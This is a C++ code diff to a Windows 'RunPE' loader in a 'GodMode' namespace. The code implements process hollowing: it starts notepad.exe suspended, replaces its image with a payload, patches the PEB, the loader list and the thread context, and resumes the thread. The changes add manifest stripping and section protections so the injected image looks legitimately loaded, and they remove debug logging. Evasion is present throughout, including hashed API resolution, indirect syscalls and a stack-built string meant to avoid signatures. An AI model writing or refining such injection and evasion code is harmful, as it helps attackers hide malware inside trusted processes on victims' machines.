@@ -11,7 +11,6 @@
 #include "GodMode.h"
 #include "ApiResolver.h"
 #include "Syscall.h"
-#include "IATLog.h"
 #include <winternl.h>
 
 namespace {
@@ -51,6 +50,132 @@ namespace {
         ULONG ValueLength;
     };
 #pragma pack(pop)
+
+    // ── Strip RT_MANIFEST from mapped PE image ──
+    // Removes the resource directory entry for RT_MANIFEST (type 24) from
+    // the PE headers in the mapped buffer. This prevents the Windows loader
+    // from applying an incompatible activation context when the host process
+    // has a different manifest than the payload. The loader falls back to
+    // the host's already-cached activation context, avoiding 0xc0000138.
+    // Operates on the mapped PE buffer (RVAs are direct offsets).
+    bool StripManifest(BYTE* mappedPE)
+    {
+        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mappedPE;
+        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
+        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(mappedPE + dos->e_lfanew);
+        if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
+
+        IMAGE_DATA_DIRECTORY& resDir =
+            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE];
+        if (resDir.VirtualAddress == 0 || resDir.Size == 0) return true;
+
+        // Walk the 3-level resource directory tree:
+        //   Level 1: Type directory (RT_MANIFEST = 24)
+        //   Level 2: Name/ID directory
+        //   Level 3: Language directory -> data entry
+        // We zero out the data entry (clear OffsetToData and Size) for every
+        // manifest resource, then remove the type entry from level 1.
+        BYTE* resBase = mappedPE + resDir.VirtualAddress;
+        auto* typeDir = (PIMAGE_RESOURCE_DIRECTORY)resBase;
+        ULONG typeEntryCount = typeDir->NumberOfNamedEntries + typeDir->NumberOfIdEntries;
+        auto* typeEntries = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(typeDir + 1);
+
+        for (ULONG i = 0; i < typeEntryCount; i++)
+        {
+            if (typeEntries[i].Id != 24) continue; // RT_MANIFEST
+
+            // Found RT_MANIFEST type entry — walk its subdirectory
+            ULONG nameDirOffset = typeEntries[i].OffsetToData & ~0x80000000;
+            auto* nameDir = (PIMAGE_RESOURCE_DIRECTORY)(resBase + nameDirOffset);
+            ULONG nameEntryCount = nameDir->NumberOfNamedEntries + nameDir->NumberOfIdEntries;
+            auto* nameEntries = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(nameDir + 1);
+
+            for (ULONG j = 0; j < nameEntryCount; j++)
+            {
+                ULONG langDirOffset = nameEntries[j].OffsetToData & ~0x80000000;
+                auto* langDir = (PIMAGE_RESOURCE_DIRECTORY)(resBase + langDirOffset);
+                ULONG langEntryCount = langDir->NumberOfNamedEntries + langDir->NumberOfIdEntries;
+                auto* langEntries = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(langDir + 1);
+
+                for (ULONG k = 0; k < langEntryCount; k++)
+                {
+                    auto* dataEntry = (PIMAGE_RESOURCE_DATA_ENTRY)(resBase + langEntries[k].OffsetToData);
+                    dataEntry->OffsetToData = 0;
+                    dataEntry->Size = 0;
+                }
+            }
+
+            // Remove this type entry by shifting remaining entries left
+            ULONG bytesToMove = (typeEntryCount - i - 1) * sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY);
+            if (bytesToMove > 0)
+            {
+                memmove(&typeEntries[i], &typeEntries[i + 1], bytesToMove);
+            }
+            // Zero the last entry (now duplicated)
+            memset(&typeEntries[typeEntryCount - 1], 0, sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY));
+            typeDir->NumberOfIdEntries--;
+            return true;
+        }
+        return true; // No manifest found — nothing to strip
+    }
+
+    // ── Section memory protection helper ──
+    DWORD SectionProtection(DWORD characteristics)
+    {
+        bool read    = (characteristics & IMAGE_SCN_MEM_READ)    != 0;
+        bool write   = (characteristics & IMAGE_SCN_MEM_WRITE)   != 0;
+        bool execute = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
+
+        if (read && !write && !execute)  return PAGE_READONLY;
+        if (read && write && !execute)   return PAGE_READWRITE;
+        if (read && !write && execute)   return PAGE_EXECUTE_READ;
+        if (read && write && execute)    return PAGE_EXECUTE_READWRITE;
+        if (!read && write && !execute)  return PAGE_READWRITE; // write-only → RW
+        if (!read && !write && execute)  return PAGE_EXECUTE;
+        return PAGE_READONLY; // safe default
+    }
+
+    // Apply per-section memory protections via NtProtectVirtualMemory.
+    // After mapping the PE with PAGE_EXECUTE_READWRITE (required for writing),
+    // lock down each section to its minimal necessary protection.
+    bool ApplySectionProtections(HANDLE hProcess, PVOID remoteMem,
+        PIMAGE_NT_HEADERS ntHeaders)
+    {
+        PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(ntHeaders);
+        bool allOk = true;
+
+        for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
+        {
+            DWORD desiredProtect = SectionProtection(sec[i].Characteristics);
+            PVOID sectionAddr = (BYTE*)remoteMem + sec[i].VirtualAddress;
+            SIZE_T sectionSize = sec[i].Misc.VirtualSize;
+            if (sectionSize == 0) continue;
+
+            DWORD oldProtect;
+            NTSTATUS st = Syscall::NtProtectVirtualMemory(
+                hProcess, &sectionAddr, &sectionSize,
+                desiredProtect, &oldProtect);
+
+            if (st != 0)
+            {
+                // Retry with page-aligned size
+                sectionSize = (sectionSize + 0xFFF) & ~(SIZE_T)0xFFF;
+                st = Syscall::NtProtectVirtualMemory(
+                    hProcess, &sectionAddr, &sectionSize,
+                    desiredProtect, &oldProtect);
+                if (st != 0) allOk = false;
+            }
+        }
+
+        // Headers → read-only
+        PVOID headerAddr = remoteMem;
+        SIZE_T headerSize = ntHeaders->OptionalHeader.SizeOfHeaders;
+        DWORD oldHeaderProtect;
+        Syscall::NtProtectVirtualMemory(hProcess, &headerAddr, &headerSize,
+            PAGE_READONLY, &oldHeaderProtect);
+
+        return allOk;
+    }
 
     // Resolve an api-ms-win-* DLL name to its real implementation DLL name.
     // Returns the resolved name as ANSI string (caller must free via HeapFree),
@@ -223,26 +348,22 @@ namespace GodMode
 
         void RunPE(void* payload, size_t size)
         {
-            IATLog::Write("=== RunPE START ===");
             HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
-            if (!hK32) { IATLog::Write("FAIL: kernel32 resolve"); return; }
-            IATLog::Write("OK: kernel32 resolved");
+            if (!hK32) return;
 
             // Resolve kernel32 functions via CRC32C hash
             auto pCPW = (BOOL(WINAPI*)(LPCWSTR,LPWSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCWSTR,LPSTARTUPINFOW,LPPROCESS_INFORMATION))
                 Api::GetProcByHashCrc(hK32, Api::CrcFn::CreateProcessW);
             auto pTP  = (BOOL(WINAPI*)(HANDLE,UINT))Api::GetProcByHashCrc(hK32, Api::CrcFn::TerminateProcess);
-            if (!pCPW || !pTP) { IATLog::Write("FAIL: CreateProcessW/TerminateProcess resolve"); return; }
-            IATLog::Write("OK: API resolved");
+            if (!pCPW || !pTP) return;
 
-            // Process Hollowing via svchost.exe (stack-built wide string)
+            // Process Hollowing via notepad.exe (stack-built wide string)
             STARTUPINFOW si = { sizeof(si) };
             PROCESS_INFORMATION pi = { 0 };
 
-            // Stack-built target path to avoid .rdata string signature
-            // Using notepad.exe as host — its activation context (COMCTL32 v6)
-            // matches typical GUI payloads. For production, the host should be
-            // selected to match the payload's manifest requirements.
+            // Stack-built target path to avoid .rdata string signature.
+            // With manifest stripping, any host process works — notepad.exe
+            // is a safe default that matches most GUI payload needs.
             // TODO: make host process configurable from BuildConfig.
             wchar_t target[] = { 'C',':','\\','W','i','n','d','o','w','s','\\',
                 'S','y','s','t','e','m','3','2','\\','n','o','t','e','p','a','d','.','e','x','e', 0 };
@@ -250,16 +371,13 @@ namespace GodMode
             if (!pCPW(target, NULL, NULL, NULL, FALSE,
                 CREATE_SUSPENDED, NULL, NULL, &si, &pi))
             {
-                IATLog::Write("FAIL: CreateProcessW suspended");
                 return;
             }
-            IATLog::WriteHex("CreateProcessW pid", pi.dwProcessId);
 
             // Read the PE headers from the raw payload
             PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
             if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
             {
-                IATLog::Write("FAIL: bad DOS magic");
                 pTP(pi.hProcess, 0);
                 Syscall::NtClose(pi.hProcess);
                 Syscall::NtClose(pi.hThread);
@@ -269,15 +387,11 @@ namespace GodMode
             PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)payload + dosHeader->e_lfanew);
             if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
             {
-                IATLog::Write("FAIL: bad NT signature");
                 pTP(pi.hProcess, 0);
                 Syscall::NtClose(pi.hProcess);
                 Syscall::NtClose(pi.hThread);
                 return;
             }
-            IATLog::WriteHex("Payload ImageBase", ntHeaders->OptionalHeader.ImageBase);
-            IATLog::WriteHex("Payload SizeOfImage", ntHeaders->OptionalHeader.SizeOfImage);
-            IATLog::WriteHex("Payload EntryPoint", ntHeaders->OptionalHeader.AddressOfEntryPoint);
 
             // ── Map PE locally so RVAs can be used directly ──
             // The raw payload has sections at PointerToRawData offsets, but
@@ -286,22 +400,29 @@ namespace GodMode
             BYTE* mappedPE = MapPELocally(payload, size);
             if (!mappedPE)
             {
-                IATLog::Write("FAIL: MapPELocally");
                 pTP(pi.hProcess, 0);
                 Syscall::NtClose(pi.hProcess);
                 Syscall::NtClose(pi.hThread);
                 return;
             }
-            IATLog::Write("OK: PE mapped locally");
 
             // Re-derive NT headers from mapped buffer (now RVA-safe)
             ntHeaders = (PIMAGE_NT_HEADERS)(mappedPE + dosHeader->e_lfanew);
+
+            // ── Strip RT_MANIFEST from the mapped PE ──
+            // The Windows loader caches the host process's activation context during
+            // CreateProcessW (before NtResumeThread). If the payload's manifest
+            // references SxS assemblies that the host doesn't support (e.g. COMCTL32 v6
+            // in notepad.exe payload vs svchost.exe host), the loader fails with
+            // 0xc0000138 (STATUS_DLL_NOT_FOUND). Stripping the manifest from the
+            // payload prevents the loader from trying to apply an incompatible
+            // activation context, and it falls back to the host's existing one.
+            StripManifest(mappedPE);
 
             // Get thread context via indirect syscall
             CONTEXT ctx;
             ctx.ContextFlags = CONTEXT_FULL;
             Syscall::NtGetContextThread(pi.hThread, &ctx);
-            IATLog::WriteHex("Thread Rdx/PEB", ctx.Rdx);
 
             // Read the original ImageBase from the PEB
             PVOID imageBase = NULL;
@@ -310,15 +431,12 @@ namespace GodMode
 #else
             Syscall::NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x08), &imageBase, sizeof(PVOID), NULL);
 #endif
-            IATLog::WriteHex("Original ImageBase", (ULONG_PTR)imageBase);
 
-            // Unmap the original executable (svchost.exe)
-            NTSTATUS unmapStatus = Syscall::NtUnmapViewOfSection(pi.hProcess, imageBase);
-            IATLog::WriteHex("NtUnmapViewOfSection status", (ULONG_PTR)unmapStatus);
+            // Unmap the original executable
+            Syscall::NtUnmapViewOfSection(pi.hProcess, imageBase);
 
-            // Allocate at the ORIGINAL svchost.exe ImageBase, not the payload's preferred base.
+            // Allocate at the ORIGINAL ImageBase, not the payload's preferred base.
             // The ntdll loader expects the PE at this address (PEB ImageBase).
-            // Relocations will fix up any base differences.
             PVOID remoteMem = imageBase;
             SIZE_T regionSize = ntHeaders->OptionalHeader.SizeOfImage;
             NTSTATUS status = Syscall::NtAllocateVirtualMemory(pi.hProcess, &remoteMem, &regionSize,
@@ -326,7 +444,6 @@ namespace GodMode
 
             if (status != 0)
             {
-                IATLog::Write("WARN: alloc at original base failed, trying payload base");
                 // Fallback: try at payload's preferred base
                 remoteMem = (PVOID)ntHeaders->OptionalHeader.ImageBase;
                 status = Syscall::NtAllocateVirtualMemory(pi.hProcess, &remoteMem, &regionSize,
@@ -335,7 +452,6 @@ namespace GodMode
 
             if (status != 0)
             {
-                IATLog::Write("WARN: alloc at payload base failed, trying NULL");
                 // Last resort: any available address
                 remoteMem = NULL;
                 status = Syscall::NtAllocateVirtualMemory(pi.hProcess, &remoteMem, &regionSize,
@@ -344,16 +460,12 @@ namespace GodMode
 
             if (status != 0)
             {
-                IATLog::Write("FAIL: all NtAllocateVirtualMemory attempts failed");
                 HeapFree(GetProcessHeap(), 0, mappedPE);
                 pTP(pi.hProcess, 0);
                 Syscall::NtClose(pi.hProcess);
                 Syscall::NtClose(pi.hThread);
                 return;
             }
-            IATLog::WriteHex("Allocated at", (ULONG_PTR)remoteMem);
-            IATLog::WriteHex("Delta from payload base", (ULONG_PTR)remoteMem - ntHeaders->OptionalHeader.ImageBase);
-
             // Write the mapped PE image to the remote process WITHOUT applying
             // relocations or patching ImageBase. The Windows loader (LdrpInitializeProcess)
             // will handle relocations natively when the thread resumes:
@@ -365,32 +477,30 @@ namespace GodMode
             //   6. Call the entry point
             // Skipping manual relocations avoids corrupting IAT hint entries
             // (which share the relocation table with post-resolution absolute addresses).
-            IATLog::Write("Relocs: deferred to Windows loader");
 
             Syscall::NtWriteVirtualMemory(pi.hProcess, remoteMem, mappedPE,
                 ntHeaders->OptionalHeader.SizeOfImage, NULL);
-            IATLog::Write("OK: mapped PE written to remote process");
+
+            // ── Apply per-section memory protections ──
+            // The allocation was PAGE_EXECUTE_READWRITE to allow writing.
+            // Now lock down each section to its minimal necessary protection
+            // to match how a legitimately loaded PE appears in memory.
+            ApplySectionProtections(pi.hProcess, remoteMem, ntHeaders);
 
             // ── IAT Resolution: Handled by Windows Loader ──
             // The Windows loader (ntdll!LdrpInitializeProcess) processes the import
             // table natively when the main thread resumes. It correctly resolves
-            // api-ms-win-* DLLs, handles side-by-side assemblies (COMCTL32 v5/v6),
-            // and applies the correct activation context from the embedded manifest.
-            // Manual IAT resolution via CreateRemoteThread(LoadLibraryA) is harmful:
-            // it runs before the process heap is initialized, which can corrupt state.
-            // We write the PE image with OriginalFirstThunk intact so the loader
-            // can resolve all imports from scratch.
-            IATLog::Write("IAT: deferred to Windows loader");
+            // api-ms-win-* DLLs, handles side-by-side assemblies, and applies
+            // the correct activation context. We write the PE image with
+            // OriginalFirstThunk intact so the loader resolves all imports.
 
             // ── Update PEB ImageBase ──
 #if defined(_WIN64)
             Syscall::NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10),
                 &remoteMem, sizeof(PVOID), NULL);
-            IATLog::Write("PEB ImageBase updated (x64)");
 #else
             Syscall::NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x08),
                 &remoteMem, sizeof(PVOID), NULL);
-            IATLog::Write("PEB ImageBase updated (x86)");
 #endif
 
             // ── Set entry point via RCX, let Windows loader initialize ──
@@ -405,17 +515,11 @@ namespace GodMode
 #if defined(_WIN64)
             ULONG_PTR entryAddr = (ULONG_PTR)remoteMem + ntHeaders->OptionalHeader.AddressOfEntryPoint;
             ctx.Rcx = entryAddr;
-            IATLog::WriteHex("Entry Rcx", ctx.Rcx);
-            IATLog::WriteHex("Loader Rip (unchanged)", ctx.Rip);
 #else
             ctx.Eax = (DWORD)((ULONG_PTR)remoteMem + ntHeaders->OptionalHeader.AddressOfEntryPoint);
-            IATLog::WriteHex("Entry Eax", ctx.Eax);
 #endif
-            IATLog::WriteHex("Thread Rsp before resume", ctx.Rsp);
 
             // ── Flush instruction cache in target process ──
-            // Without this, the CPU may execute stale cached instructions
-            // from the original svchost.exe image, not our newly written payload
             {
                 HMODULE hNtdll = Api::GetModuleByHashCrc(Api::CrcMod::NTDLL);
                 if (hNtdll) {
@@ -423,19 +527,13 @@ namespace GodMode
                         Api::GetProcByHashCrc(hNtdll, Crc32C::ConstHash("NtFlushInstructionCache"));
                     if (pFlush) {
                         pFlush(pi.hProcess, remoteMem, regionSize);
-                        IATLog::Write("NtFlushInstructionCache OK");
-                    } else {
-                        IATLog::Write("WARN: NtFlushInstructionCache resolve failed");
                     }
                 }
             }
 
             // ── Update LDR_DATA_TABLE_ENTRY DllBase and SizeOfImage for the main module ──
-            // The PEB LDR module list still has the old DllBase from svchost.exe.
-            // Offsets differ between x86 and x64 due to pointer/list sizes.
             // x86: LIST_ENTRY=8B, DllBase@0x18, SizeOfImage@0x20
             // x64: LIST_ENTRY=16B, DllBase@0x30, SizeOfImage@0x40
-            #if 1
             {
                 PVOID pebAddr = (PVOID)ctx.Rdx;
                 PVOID ldrAddr = NULL;
@@ -460,28 +558,16 @@ namespace GodMode
                         Syscall::NtWriteVirtualMemory(pi.hProcess,
                             (BYTE*)firstEntryAddr + offSizeOfImage,
                             &newImageSize, sizeof(DWORD), NULL);
-                        IATLog::Write("LDR DllBase+SizeOfImage updated");
                     }
                 }
             }
-            #endif
 
             // ── Update PEB ProcessParameters ImagePathName & CommandLine ──
-            // The Windows loader (LdrpInitializeProcess) uses ImagePathName to
-            // locate the activation context (.manifest) for SxS assembly binding.
-            // When the host process differs from the payload, the cached
-            // activation context from the host exe's manifest may not match
-            // the payload's SxS dependencies (e.g. COMCTL32 v6 vs v5).
-            // We overwrite the path string in-place so the loader finds the
-            // correct manifest when it re-initializes the activation context.
-            // NOTE: This only works when the host exe's pre-cached activation
-            // context data is compatible or when the payload path matches the
-            // host. For payloads with complex SxS needs, the host should be
-            // chosen to match (e.g. notepad.exe for GUI payloads).
+            // Overwrite the path string in-place (keep original Buffer pointer
+            // which points into the contiguous ProcessParameters allocation).
             // Offsets (x64): PEB->ProcessParameters @ 0x20
             //   ImagePathName @ 0x60, CommandLine @ 0x70
             //   UNICODE_STRING: Length@+0x00, MaxLen@+0x02, Buffer@+0x08
-            #if 1  // Enabled: in-place PEB update works for same-manifest host
             {
                 PVOID pebAddr = (PVOID)ctx.Rdx;
                 PVOID paramsAddr = NULL;
@@ -519,35 +605,21 @@ namespace GodMode
                                 Syscall::NtWriteVirtualMemory(pi.hProcess,
                                     (BYTE*)paramsAddr + 0x70, &pathBytes, sizeof(USHORT), NULL);
                             }
-                            IATLog::Write("PEB ProcessParameters updated (in-place)");
-                        } else {
-                            IATLog::Write("WARN: payload path too long for existing PEB buffer");
                         }
                     }
                 }
             }
-            #endif
 
             Syscall::NtSetContextThread(pi.hThread, &ctx);
-            IATLog::Write("SetThreadContext OK");
 
             Syscall::NtResumeThread(pi.hThread, NULL);
-            IATLog::Write("=== NtResumeThread called === RUNPE DONE ===");
 
-            // Wait for the hollowed process and check its exit code
+            // Wait for the hollowed process and clean up
             {
                 auto pWFSO2 = (DWORD(WINAPI*)(HANDLE,DWORD))
                     Api::GetProcByHashCrc(hK32, Api::CrcFn::WaitForSingleObject);
                 if (pWFSO2) {
-                    DWORD waitResult = pWFSO2(pi.hProcess, 5000);
-                    IATLog::WriteHex("WaitForSingleObject result", waitResult);
-                    auto pGPE = (BOOL(WINAPI*)(HANDLE,LPDWORD))
-                        Api::GetProcByHashCrc(hK32, Crc32C::ConstHash("GetExitCodeProcess"));
-                    if (pGPE) {
-                        DWORD exitCode = 0;
-                        pGPE(pi.hProcess, &exitCode);
-                        IATLog::WriteHex("Remote process exit code", exitCode);
-                    }
+                    pWFSO2(pi.hProcess, 5000);
                 }
             }
 
